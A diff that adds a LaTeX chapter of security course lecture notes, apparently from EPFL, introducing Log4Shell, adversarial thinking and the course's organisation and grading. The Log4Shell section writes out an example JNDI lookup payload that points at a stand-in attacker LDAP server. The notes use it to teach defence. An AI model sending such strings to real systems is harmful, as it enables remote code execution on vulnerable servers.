@@ -1,0 +1,139 @@
+% =========================================================
+\chapter{Lecture 0 : Preliminaries}
+% =========================================================
+
+\begin{rembox}[title=In a nutshell]
+\textbf{What is this lecture about?} Why the course exists, told through one real disaster
+(\textbf{Log4Shell}, 2021), what ``hacking'' means, what the course aims at (principles that
+outlast technology, \textbf{adversarial thinking}, a toolbox of mechanisms) and how it is
+organised. \\
+\textbf{Why is it useful?} It sets the attitude of the whole course: always ask ``how can this be
+made to fail?'', not only ``how can this be made to work?''.
+\end{rembox}
+
+\section{An introductory story: Log4Shell}
+
+\begin{exbox}[title={Log4j and JNDI}]
+\textbf{Log4j} is a very popular Java logging library: applications use it to record user
+logins, errors, system events, debug information. It is in millions of applications, from
+Minecraft to the cloud services of Apple, Amazon and Google. It can expand placeholders in the
+logged text, e.g.\ \texttt{log.info("Running on Java version: \$\{java:version\}.")}. \\
+\textbf{JNDI} is a Java service that distributes serialized objects \emph{and code}. Log4j
+supported JNDI lookups inside log messages, e.g.\ \texttt{\$\{jndi:ldap://epfl.ch/statusJava\}}:
+the logger fetches an object from a remote server while logging.
+\end{exbox}
+
+\begin{exbox}[title={The attack (CVE-2021-44228, ``Log4Shell'', 10 December 2021)}]
+A chat server logs the messages of its users: \texttt{logger.debug("User \{\} sent message
+\{\}", user, message)}. A user sends the message
+\texttt{\$\{jndi:ldap://myAttackerServer.ch/anAttackerObject\}}. While \emph{logging} it, the
+server contacts the attacker's server, downloads the attacker's object and runs its code:
+\textbf{remote code execution} from a chat message. \\
+Severity score \textbf{10.0 / 10}. Attack surface: nearly every major organisation. Consequences:
+ransomware, cryptocurrency miners, theft of data and credentials, persistent backdoors. A global
+scramble to patch.
+\end{exbox}
+
+\begin{propbox}[title=Lessons learned]
+\begin{itemize}
+  \item The obvious one: \textbf{sanitize user inputs} (see sanitization, Lecture 4).
+  \item \textbf{Software supply chain security}: you are vulnerable to the flaws of the software
+        you use.
+  \item \textbf{Software Bill of Materials (SBOM)}: know exactly which components are in your
+        software --- you cannot patch what you do not know you have.
+  \item \textbf{Defence in depth}: a single flaw can bypass defences; several layers are needed
+        (Lecture 1).
+  \item \textbf{Default configurations matter}: dangerous features should be disabled by default
+        (fail-safe defaults, Lecture 2).
+  \item Security requires communication: vulnerabilities are published as \textbf{CVEs}
+        (Common Vulnerabilities and Exposures).
+\end{itemize}
+\end{propbox}
+
+\begin{goatbox}
+A logging library is a notebook where a program writes what happens. Log4j's notebook had a
+magic feature: some words written in it were ``instructions to go fetch something''. So a
+stranger only had to \emph{say} those words in a chat for the server to write them down, go fetch
+the stranger's package, and open it. Nobody had thought that writing in a notebook could be
+dangerous.
+\end{goatbox}
+
+\section{What hacking is, and what this course is about}
+
+\begin{defnbox}[title=Two views of hacking]
+\begin{itemize}
+  \item \textbf{Hacking as ``breaking things''} (the common view): exploiting vulnerabilities for
+        unauthorized access or malicious intent. The course studies it a little, to understand
+        the attacker's methods and build effective defences.
+  \item \textbf{Hacking as ``creative problem solving''} (the original MIT definition): finding
+        clever, elegant, often unintended solutions or uses of a system, from a deep
+        understanding of it. The course embraces this spirit to study the security of systems.
+\end{itemize}
+\textbf{Not} the purpose: a ``how-to-hack'' course, advanced exploitation, CTF training (join the
+EPFL CTF team for that).
+\end{defnbox}
+
+\begin{defnbox}[title=The three aims of the course]
+\begin{enumerate}
+  \item Understand the \textbf{basic concepts and principles} of security design and engineering,
+        which will outlast current technology.
+  \item Learn to \textbf{model threats} and think critically about security problems:
+        \textbf{adversarial thinking}.
+  \item Get familiar with \textbf{security mechanisms}, their purpose and their limitations: a
+        \textbf{toolbox} for security engineering (know the tools, evaluate their pros and cons
+        in a scenario, know where to search further).
+\end{enumerate}
+Topics: principles, access control, applied cryptography, authentication, attacks and malware,
+software security, web \& network security, privacy.
+\end{defnbox}
+
+\begin{exbox}[title={The security mindset: ``Keep the change'' (Bank of America)}]
+If you buy something for $X$ dollars and $Y$ cents, the bank charges you $X+1$ and puts $1-Y$ in
+your savings account (a coffee at \$2.75: charged \$3, \$0.25 saved). The first three months, the
+bank does not charge the $+1$, it only adds the cents to the savings. \textbf{What can go wrong?}
+Buy many tiny things priced \$X.01 during the first three months: each gives you \$0.99 of free
+savings. \\
+``Good engineering involves thinking about how things can be made to work; the security mindset
+involves thinking about how things can be made to fail.'' (Bruce Schneier)
+\end{exbox}
+
+\begin{goatbox}
+A normal engineer asks ``does my fence keep the goats in?''. A security engineer asks ``if I were
+a very clever goat who \emph{wants} to get out, where would I push?''. This course trains you to
+be that clever goat, so that you build better fences.
+\end{goatbox}
+
+\section{Organisation}
+
+\begin{rembox}[title=Course organisation]
+\begin{itemize}
+  \item Lectures on Thursday morning, interleaved with problem solving; exercise sessions
+        (programming homework Q\&A, theory exercises, practice problem sets).
+  \item \textbf{5 graded programming assignments}, done \textbf{individually}, in Python, on Linux
+        with root access (own machine or the COM-301 VM).
+  \item \textbf{Mid-term} (Tuesday Nov 3, 2026) and \textbf{final} (January 2027): closed book,
+        only a cheat sheet.
+  \item \textbf{Grade} $= 80\%$ final $+ 10\%$ assignments $+ 10\%$ mid-term. You are never
+        graded in lectures, exercises or on the forum (EdStem): ask questions.
+  \item Books: Gollmann \emph{Computer Security}, Anderson \emph{Security Engineering}, Stallings
+        \& Brown \emph{Computer Security: Principles and Practice}. Read the news to train your
+        adversarial thinking.
+\end{itemize}
+(Joke of the slides: ``Moodle restrictions are not an actual access control mechanism''.)
+\end{rembox}
+
+\begin{recapbox}[title={Exam-ready recap --- Lecture 0: Preliminaries}]
+\begin{itemize}
+  \item \textbf{Log4Shell} (CVE-2021-44228, score 10/10): Log4j expanded \texttt{\$\{jndi:\ldots\}}
+        in logged text, so a logged user message made the server download and run the
+        attacker's code. Lessons: sanitize inputs, supply chain security, SBOM, defence in depth,
+        safe defaults.
+  \item \textbf{Hacking}: breaking things vs.\ creative problem solving (original MIT meaning).
+  \item \textbf{Aims}: lasting principles, \textbf{adversarial thinking} (``how can it be made to
+        fail?''), a toolbox of mechanisms with their limits.
+  \item Grade: 80\% final, 10\% assignments, 10\% mid-term; exams closed book with a cheat sheet.
+\end{itemize}
+\textbf{How it builds on what came before}: this is the starting point. Every later chapter is an
+answer to the Log4Shell question: what must hold (policy), against whom (threat model), with what
+(mechanisms), and how to design them so that one forgotten detail does not break everything.
+\end{recapbox}
